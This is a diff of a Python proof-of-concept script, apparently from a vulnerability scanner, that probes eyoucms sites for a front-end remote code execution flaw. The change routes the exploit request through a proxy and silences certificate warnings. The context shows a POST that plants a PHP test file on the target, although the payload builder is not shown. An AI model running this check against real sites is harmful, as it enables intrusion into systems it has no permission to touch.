@@ -2,13 +2,13 @@
 # _*_ coding:utf-8 _*_
 
 import requests
-import requests.packages.urllib3
 import base64
 import json
-from Config.config_requests import ua
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from Config.config_proxies import proxies
+from Config.config_requests import ua
+
+requests.packages.urllib3.disable_warnings()
 
 
 # 脚本信息
@@ -41,7 +41,7 @@ def poc(target):
         "attarray" : creat_payload(),
         "htmlcode" : "testtest"
     }
-    res = requests.post(url, data=data, headers=headers, verify=False, timeout=5)
+    res = requests.post(url, data=data, headers=headers, verify=False, timeout=5,proxies=proxies)
     if "this is a friendly test" in res.text:
         result['message'] = "存在eyoucms前台RCE漏洞"
         result['poc_url'] = target+"/testtest.php"
